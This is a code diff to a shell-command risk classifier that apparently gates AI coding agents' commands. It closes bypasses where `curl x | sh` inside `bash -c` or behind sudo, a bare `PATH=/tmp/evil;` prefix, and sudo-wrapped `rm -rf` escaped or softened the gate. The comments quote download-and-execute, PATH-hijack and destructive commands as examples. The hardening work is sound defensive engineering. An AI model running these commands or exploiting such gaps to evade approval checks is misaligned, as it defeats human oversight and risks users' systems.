@@ -267,13 +267,22 @@ function analyzeShell(
   // Executing fetched content: a shell or interpreter downstream of a fetcher
   // in the same pipeline. `curl x | sh` is the canonical form, but
   // `wget -O - x | python` is the same thing.
+  //
+  // Scanned over `effs`, not over `parsed.commands`. The top-level parse of
+  // `bash -c "curl http://x.sh | sh"` is a single `bash`, so the fetcher and
+  // the shell it feeds were both invisible here and the download-and-execute
+  // lost `guard.pipe-to-shell` and its `irreversible` reversibility — which on
+  // Codex's unattended modes is the difference between a deny and no gate at
+  // all. The effective inventory is where both commands actually are, and it
+  // also sees through the wrappers on either end: `sudo curl x | sh` and
+  // `curl x | sudo sh` were missed for the same reason.
   let pipedFromNetwork = false;
-  for (let i = 0; i < parsed.commands.length; i++) {
-    const c = parsed.commands[i]!;
+  for (let i = 0; i < effs.length; i++) {
+    const c = effs[i]!.command;
     if (!c.contexts.includes('pipe')) continue;
     if (!SHELLS.has(baseName(c.name))) continue;
     for (let j = i - 1; j >= 0; j--) {
-      const prev = parsed.commands[j]!;
+      const prev = effs[j]!.command;
       if (NETWORK_FETCHERS.has(baseName(prev.name))) {
         pipedFromNetwork = true;
         break;
@@ -436,8 +445,26 @@ function buildShellAction(
   pipedFromNetwork: boolean,
 ): Action {
   const cmd = eff.command;
-  const program = baseName(cmd.name);
-  const argv = [program, ...cmd.argv.slice(1)];
+
+  // A command with no program still does something.
+  //
+  // `PATH=/tmp/evil` decides what every later command in the shell resolves to,
+  // and `X=1 > ~/.bashrc` truncates a startup file. Both used to be discarded
+  // before they ever reached here, so `PATH=/tmp/evil; npm test` produced a
+  // single action byte-identical to an honest `npm test` and spent its
+  // approvals — while `PATH=/tmp/evil npm test`, the same shell effect one
+  // space apart, was correctly refused.
+  //
+  // The judgement borrowed is `export`'s, deliberately. A bare assignment and
+  // an exported one have the same consequence for whatever runs next, we cannot
+  // tell from argv whether the name was already exported, and the rule for
+  // which variables redirect execution already lives in exactly one place. The
+  // display and the signature stay in the spelling the caller actually used.
+  const assignmentOnly = !cmd.name && !cmd.argv.length && cmd.assignments.length > 0;
+  const program = assignmentOnly ? 'export' : baseName(cmd.name);
+  const argv = assignmentOnly
+    ? ['export', ...cmd.assignments.map((a) => `${a.name}=${a.value}`)]
+    : [program, ...cmd.argv.slice(1)];
 
   const mod = lookup(program);
   let j: Judgement | null = mod ? mod.classify(argv, kctx) : null;
@@ -454,11 +481,28 @@ function buildShellAction(
 
   // Wrapper tags override the inner judgement where the wrapper is the point:
   // `ssh host ls` is not a directory listing, it is a remote session.
+  //
+  // Every one of these only ever escalates. Assigning instead of taking the
+  // worse value made a wrapper able to *soften* what it wrapped: `sudo` set
+  // reversibility to `hard`, so `sudo rm -rf /tmp/x` and `sudo git push
+  // --force` came back one step below `irreversible` and lost
+  // `guard.irreversible` — a floor, not a tier nudge. Wrapping something in a
+  // privilege escalation is not a reason to worry about it less. The same
+  // applies to `ssh`, whose `external` is below `production`.
   for (const w of eff.wrappers) {
     if (w.tag === 'remote') {
-      j = { ...j, capability: 'exec.remote', reach: 'external', note: w.note };
+      j = {
+        ...j,
+        capability: 'exec.remote',
+        reach: worseReach(j.reach ?? 'workspace', 'external'),
+        note: w.note,
+      };
     } else if (w.tag === 'privilege') {
-      j = { ...j, reach: worseReach(j.reach ?? 'workspace', 'machine'), reversibility: 'hard' };
+      j = {
+        ...j,
+        reach: worseReach(j.reach ?? 'workspace', 'machine'),
+        reversibility: worseReversibility(j.reversibility ?? 'trivial', 'hard'),
+      };
     } else if (w.tag === 'container' || w.tag === 'k8s') {
       j = { ...j, capability: 'exec.container', note: w.note };
     }
@@ -644,11 +688,15 @@ function buildShellAction(
   return {
     kind: kindFor(j.capability),
     capability: j.capability,
-    signature:
-      assignmentSignature(cmd.assignments, sctx) +
-      commandSignature(argv, sctx) +
-      redirectSignature(cmd.redirects, sctx),
-    display: redact(renderArgv(argv, root)),
+    // For an assignment-only command the assignments *are* the command, so they
+    // are named once, by `assignmentSignature`, which keeps the variable name
+    // and templates only the value — the same rule the inline prefix form uses.
+    signature: assignmentOnly
+      ? assignmentSignature(cmd.assignments, sctx).trimEnd() + redirectSignature(cmd.redirects, sctx)
+      : assignmentSignature(cmd.assignments, sctx) +
+        commandSignature(argv, sctx) +
+        redirectSignature(cmd.redirects, sctx),
+    display: redact(renderArgv(assignmentOnly ? argv.slice(1) : argv, root)),
     blast,
     targets,
     understood,
@@ -1095,6 +1143,15 @@ const REACH_ORDER = ['none', 'workspace', 'machine', 'network', 'external', 'pro
 
 function worseReach(a: BlastRadius['reach'], b: BlastRadius['reach']): BlastRadius['reach'] {
   return REACH_ORDER.indexOf(a) >= REACH_ORDER.indexOf(b) ? a : b;
+}
+
+const REVERSIBILITY_ORDER = ['trivial', 'easy', 'hard', 'irreversible'] as const;
+
+function worseReversibility(
+  a: BlastRadius['reversibility'],
+  b: BlastRadius['reversibility'],
+): BlastRadius['reversibility'] {
+  return REVERSIBILITY_ORDER.indexOf(a) >= REVERSIBILITY_ORDER.indexOf(b) ? a : b;
 }
 
 function kindFor(c: Capability): ActionKind {
